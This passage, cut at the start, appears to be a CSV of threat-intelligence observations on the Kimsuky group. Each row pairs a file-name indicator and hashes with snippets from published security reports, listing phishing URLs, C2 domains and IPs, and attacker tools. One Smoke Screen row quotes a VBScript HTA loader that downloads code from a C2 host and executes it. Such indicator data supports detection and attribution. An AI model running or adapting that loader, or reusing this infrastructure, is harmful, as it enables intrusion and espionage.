remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:059ae026a7877a2558b9a1265b56fc90acc9ca02c1f34ecdec001cc59c5fd39c,observation--sha256:dd2dac68d02ee0785cdf7f61bb01175cf9ec0a75ff59be8e5d8c41380403dd71,file-name,(draft).hwp,draft).hwp,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Although we did not secure the original email related to the phishing in the above (Figure 23), considering the past actions of the Kimsuky organization, when sending a phishing email, it would have included a link to a large attachment or a link in the email body, and when the user clicks on the link, the index. You will access the Yahoo login page through php (proxy page). hxxp://www.namastte.kr/yahoo/index.php?menu=Y2ltb*****==&q=hxxps://login.yahoo.com/?.src=ym&pspi d=2023538075&activity=yba",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:059ae026a7877a2558b9a1265b56fc90acc9ca02c1f34ecdec001cc59c5fd39c,observation--sha256:5baf8fedb18cf5a8becba6276d90d71aa73f960412767c415495103d867b5033,file-name,(draft).hwp,draft).hwp,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:171141ea0e1053367abb6252f910ee86f3d34316c003d6709c08733f74675d66,observation--sha256:67354fa679a4f52369fe9e4bfabf9c95f66b227fde9d5890dc13901a3430d52c,file-name,driver.cfg,driver.cfg,candidate,2021-01-23T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 此外，在今年 1 月份攻击者同样伪装韩国国防部相关文档进行攻击活动，样本信息如 下： 文件名称 driver.cfg MD5 7e041b101e1e574fb81f3f0cdf1c72b8 SHA1 2dccc8eb48bc7bdbde42cc4450086acac2c6ceeb SHA256 742e04ae5f2cd42cf514abbd1956c5993a3a3b268f4abe6e107f81097a7 5d509 文件大小 2204672 字节 (2.10 MB) 文件格式 PE64 EXE 编译时间 2021/01/23 02:11:43 诱饵文档内容为韩国国防部工作报告相关内容，图标伪装成 hwp 文档图标，诱导用户 点 击 执 行 ， 之 后 加 载 执 行 的 RAT 模 块 中 使 用 的 C2 服 务 器 为 imap.pamik.cf 和 exchange.amikbvx.cf，两者均被解析到服务器 104.128.239.70。 图[28].伪装成“韩国国防部工作报告,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:56551d0fc2c48a3d680c58a6a03a3e0c22ac6c56d7170395910a8fe527553ded,observation--sha256:84c824e6c8c1418f3ec89e296ff1411d869ab783e5d09f7553d963e5a80d5d9e,file-name,dropper-regsvr32(x86).dll,dropper-regsvr32(x86).dll,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 18}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 18 VIRUS BULLETIN CONFERENCE OCTOBER 2021 In the case of sending and receiving mail internally, due to the fact that the internal mail didn’t go through a separate security solution, executable malware could be distributed. V3 Update_3.5.1.exe (Dropper): 686e3874b772c806e0809fcb933b50ff C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll (AppleSeed):46c4c19a61e034e7b35e70c459f5692f dropper-regsvr32(x86).dll(",
1.0.0,actor--kimsuky,artifact--sha256:87b596bc7f21232cbc0526e0b80337373d1d228ca5520c1cb90ef9aa6dbbdfd7,observation--sha256:51f35539990f07a01a640f9ff59967c7c4fe49ead4d61e74e57cde85ac1338b4,file-name,dubrute.exe,dubrute.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:81a71f7d2997d7267b343f0318466f1d1e2279770139ef647820a026dabe98f0,observation--sha256:0de023dc7d1ee6b3813ab86e3ff5fb1bd5930f6b41028ad1b2942fd9ddc2b5f8,file-name,e_dotnetmem.dll,e_dotnetmem.dll,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:59c0ba26b52a8f6738e32eec0268a0a8d6988c719e423a6dc276d18bd31e2a17,observation--sha256:8a11445e54ca971a220d110b63210f2a9782b446edcbcf15568b4bc9e6dbd673,file-name,e_x64_windows.dll,e_x64_windows.dll,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:99152fabc408e33d52e5d52d513447561ac251b5632d3cd9a790f8b46c9d3ca7,observation--sha256:08aa148be09e6b87015308c50a05d9626a2a251d28ef292fab9934572a984f83,file-name,e_x86_windows.dll,e_x86_windows.dll,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7a06fbc0006bb8dc77419060fac75973b0d41388a48b54a5de7069dbcb49a8c7,observation--sha256:b7bea48e2783e2000c55a42a539318e6b1487b8b32dc841c33bbb69bb8c7cc7a,file-name,e_x86_windows_svc.exe,e_x86_windows_svc.exe,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0ba3e94c7aae42cdfa5eb0bf22818fc7066f5d6a808834889c6524435ebeaee6,observation--sha256:ec5f90035d54c6b9baa72cb2f5d16f7317539fb9d3e19f57eb74d52955fa4a22,file-name,elites.docm,elites.docm,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ Temp folder image File, Kakao (Daum) phishing mailer As a result of deactivation and analysis, malicious macros were present. (Analysis data) North Korea's position on the use of nuclear force as seen through the April 25 military parade and When executed, additional malicious code is downloaded and executed, and the structure is the same as ""(Figure 26) Malicious code infection process"" above . [+] Joint security advisory from the National Intelligence Service (NIS) and the German Office for ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0ba3e94c7aae42cdfa5eb0bf22818fc7066f5d6a808834889c6524435ebeaee6,observation--sha256:7d304ca22398268e4d4803d07bcada0d8ba2d12e65a60b1f83526f0c422b2793,file-name,elites.docm,elites.docm,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5199236c92f626e56fbe84743acf7a07769347739a74db50260ac4b345ff23ce,observation--sha256:c7df9bfc92f44630aa33d8638085e1bd2a9221710e845597a6648754dd1a8a7e,file-name,emaudittouch-2.1.0.exe,emaudittouch-2.1.0.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5e1305ec38227ec3de43c64d7e538b0de3c154bcc22d1bbe829b0bdddf4e6f17,observation--sha256:b52cfb6f913ba2778fd56f119234cfdd0b1f04542d68af8c22b79f3a9bd5709c,file-name,empty.pdb,empty.pdb,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 33}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○추가로, 해당유형의CHM공격C2서버에서“nhgames.zip” 라는이름의ZIP파일로위장한실행파일이배포된정황을확인했습니다. ○해당파일에대한분석을진행했지만, 의심스러운악성행위는발견되지않았으며, 공격자가제작중인테스트파일로추정하고있습니다. 또한, 공격자가“DarkHorse” 라는사용자이름을사용하는사실을확인할수있었고이번보고서의OperationName 으로명명하게됐습니다. PDB C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로 [그림4-6] nhgames.zip파일 Genians SecurityCenter 32",
1.0.0,actor--kimsuky,artifact--sha256:aa92909d4fdb58f7dead7000c7a344852792889fd10cd6049e8e247e085fcabc,observation--sha256:12d5e7ea1eb638546ba21e406199756fc8115e5c775109ccaf80c8f1c2a632fb,file-name,environment.hwp,environment.hwp,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 62}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Bait file name National Assembly Legislative Research Service Advisory Request.docx Data URL Bait file name Analysis of North Korea’s foreign currency acquisition channels and measures to improve the effectiveness of sanctions against North Korea.pdf URL hxxps://attach.mail.daum.net/bigfile/v1/urls/d/JClVvbVCUf8Hfp Z-7_-A2w8PqyU/ JKH7ptbHMvh7XOnhrJ7UlQ (expired) Phishing URL 1 ****Institute, ******ng (***, former Minister of **) hacking target **University, ***kim*** (**, Professor) Phishing URL",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:21e806e784ab5879dbc8e9b1ee5a5f6a289535a4ed588932248eab4aaa05bfc6,observation--sha256:41af0b4a6f5161d63b582b111d46ea250ee8ccb758820d8e03646e470cd66a5e,file-name,epulsar-1.3.1.exe,epulsar-1.3.1.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f9ea95247963e3a8c6a4d7fa7d04a29535964eb6bf0ba5e3ed56db8e2b19c06,observation--sha256:f601087104739a3be7467351fbfa40b88e2319ef007701bfc806460f612913fc,file-name,er.exe,er.exe,candidate,2020-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TARGET2CURRENT_PROCESSTIME TARGET1PARENT_PROCESS 11:27:59 0.0.0.0:57318 This is an IP to which a phishing URL impersonating the Ministry of Unification has been mapped, and recently, a URL for Naver phishing has been mapped as well. There are also many malicious URLs mapped. 2020.08 ~ 2020.09 2020.12 ~ 2021.03 There is evidence that the Kimsuky organization attempted to connect to 78 IPs through RDP at a domestic transit point (KR) from February 2023 to April 2023. mstsc.exe %systemroot%\system3",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6ba2c272c51944fe58673bac48fbb470fbab383ec3cd307511821191ed837b11,observation--sha256:eb347ee0d2591b595a8653ea849df02d07b15de1d70f2ed58f29fada81da04d6,file-name,espoofer-master_google.zip,espoofer-master_google.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"mmm.zip We suspect that phishing emails may have been sent afterwards. It is also possible that the Kimsuky organization only prepared to send phishing emails but did not actually send them. Python used to develop the above espoofer (Figure 29) Kimsuky organization account information and hacking target email address stored in Config.py espoofer-master_google.zip It is impossible to confirm whether the Kimsuky organization sent phishing emails to members of the National Assembly and, if so, the ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7f87b4bfa714e3e3246669fdc22f49c0cad306dbf5bddf5691393ed725b88209,observation--sha256:e4db0592c1c1fe226369068c0b2404904281bae6011c9ee97ee2c8abdb9c0c9c,file-name,espoofer-master_naver.zip,espoofer-master_naver.zip,candidate,2022-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"There is a history, and malicious URLs with similar patterns are registered for each IP. At first glance, the common characteristics of malicious URLs are navernnail.com URL explanation RdpScan_La05_1226_x64.rar ZOOKAgentSetup.zip 41 (Figure 28) Malicious document execution and C2 communication 61.82.110.60(KR) navernnail.com IP Operation Covert Stalker Report navernnail.com It is very important information in profiling because it can track and identify hacking activities, and is a very importan",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7f87b4bfa714e3e3246669fdc22f49c0cad306dbf5bddf5691393ed725b88209,observation--sha256:f2673257f8c52fe6e6370234b1e9dc4c48f2bf893a548d5bda800104d4da316d,file-name,espoofer-master_naver.zip,espoofer-master_naver.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"mmm.zip We suspect that phishing emails may have been sent afterwards. It is also possible that the Kimsuky organization only prepared to send phishing emails but did not actually send them. Python used to develop the above espoofer (Figure 29) Kimsuky organization account information and hacking target email address stored in Config.py espoofer-master_google.zip It is impossible to confirm whether the Kimsuky organization sent phishing emails to members of the National Assembly and, if so, the ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7f87b4bfa714e3e3246669fdc22f49c0cad306dbf5bddf5691393ed725b88209,observation--sha256:28e87801701a47c92762fc7d3d1f23c7dbd0808d4ff6dc05e361f8273419557a,file-name,espoofer-master_naver.zip,espoofer-master_naver.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://nidlogin.navernnail.com/nidlogin.login?mode=form&url=hx xps%3A%2F%2Fwww.naver.com&locale=ko_KR&svctype=1&otp= hxxps://accounts.googlernails.com/signin/v2/identifier?hl=en&passiv e=true&continue=hxxps%3A%2F%2Fwww.google.com%2F&ec=GAZ AmgQ&flowName=GlifWebSignIn&flowEntry=ServiceLogin&otp= Based on the analysis of espoofer-master_naver.zip so far, the process of sending phishing emails is summarized as shown below (Figure 32). Using the stolen account information, the hacked target's email",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:707ee6f52776a5c09331a0d0d8433da3b70fe1b610b02a1fbfbc85f2563cfad7,observation--sha256:2d8d67b3d90c0d5a899313c37a6f3a80f165cfc26d95ae71468c135f4d63502f,file-name,explorer.exe,explorer.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:707ee6f52776a5c09331a0d0d8433da3b70fe1b610b02a1fbfbc85f2563cfad7,observation--sha256:419e35ff4ad938bd5eea94b3a2fea258c56ad2e950f5867b290cc1ba0177ff8f,file-name,explorer.exe,explorer.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e72c52fe1135e1e925030b94c076e8e7c0d7b04811f2af1ca8ef60c0cb5b6f3,observation--sha256:9c9ad5e38bf71738789f57ed155968453f3cb7f6b5ce48572ceb08f8364e8049,file-name,explorer.tmp,explorer.tmp,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:2903d22c6295fb903b8893293e5bc8c9406525d72fe39c78be47510ee48aba8a,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 10}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"<html><script language=""VBScript"">On Error Resume Next:Function Co00(c):L=Len(c):s="""":For jx=0 To d- 1:For ix=0 To Int(L/d)-1:s=s&Mid(c,ix*d+jx+1,1):Next:Next:s=s&Right(c,L-Int(L/d)*d):Co00=s:End Function:Set Post0 = CreateObject(""MSXML2.ServerXMLHTTP.6.0""):Post0.open ""GET"", ""https://christinadudley[.]com/public_html/includes/common/expres.php?op=1"", False:Post0.Send:t0=Post0.responseText:d=7:t0=Co00(t0):Execute(t0):window.close()</script></html> The finally delivered file 'exe.gif' is encoded i",
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:39aff7eadc95c9a4eaabe089961cbe15b4c068175d18e07d65e0b2ddc3f7a81e,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 12}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 6] Comparison of malicious scripts found home and abroad In particular, the above figure shows that the function styles used by PowerShell as well as the file names ('expres.php?op=1', 'cow.php?op=1"") and parameters used to communicate with the C2 server are very similar in both scripts.",
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:52e5db58be2deaf6c88465b215a47e973a5a8b0c2c77f9bab14a232106a3d80e,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:f039324448eb16178ab048431a6262c3b4d3604f2dd43deebbb30740bc205878,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:39a6cd1b6fdb60ad4d76b6d5837ef9a8d73fa84303a8a90bb966341b56b8111b,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 2}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 1] E-mail disguised as government official's remarks about Korea-US Summit The threat actor attempts to trick users into opening the email titled “Government official's remarks about Korea-US Summit, with a malicious .hwp attachment named ‘Government official's remarks about Korea-US Summit.hwp’. As the distributed malicious hwp document file was encrypted, the EPS vulnerability could not be exploited without entering the password. When a document file vulnerability is triggered, it atte",
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:14e7a96b13e1ee97293dcddf16594bad2e6f3e0e895d4c20fce3f6f7c194248c,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 3}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Post0.Send: t0=Post0.responseText: Execute(t0) The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell- based keylogger, and secretly collects information from the infected computer, then registers itself in the system registry to conduct espionage operations by communicating with its C2 server. - http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta - http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1 - http://naban.co[.]kr/mobile/skin/member/c",
